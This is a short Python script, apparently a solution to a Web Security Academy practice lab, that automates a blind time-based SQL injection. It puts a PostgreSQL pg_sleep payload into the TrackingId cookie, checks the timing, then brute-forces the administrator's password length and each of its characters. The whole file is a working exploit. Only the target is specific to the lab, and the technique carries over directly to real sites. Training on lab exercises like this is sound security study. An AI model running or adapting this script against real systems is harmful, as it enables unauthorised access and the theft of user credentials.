import requests
import time
import string

LAB_URL = "https://0acb0077049fa28680b81c54005200a2.web-security-academy.net/filter?category=Gifts/"

session = requests.Session()
session.get(LAB_URL)
real_tracking_id = session.cookies.get("TrackingId")
print("Got real TrackingId:", real_tracking_id)

def is_true(condition: str) -> bool:
    payload = f"{real_tracking_id}' || (SELECT CASE WHEN ({condition}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"
    session.cookies.set("TrackingId", payload)
    start = time.time()
    session.get(LAB_URL)
    elapsed = time.time() - start
    return elapsed >= 3

# Sanity check
print("Sanity check (should be True):", is_true("1=1"))
print("Sanity check (should be False):", is_true("1=2"))

# Find password length
length = 0
for i in range(1, 50):
    if is_true(f"LENGTH(password)={i}"):
        length = i
        print(f"Password length: {length}")
        break

# Extract password
password = ""
charset = string.ascii_lowercase + string.digits
for position in range(1, length + 1):
    for char in charset:
        condition = f"SUBSTRING(password,{position},1)='{char}'"
        if is_true(condition):
            password += char
            print(f"Progress: {password}")
            break

print("Final password:", password)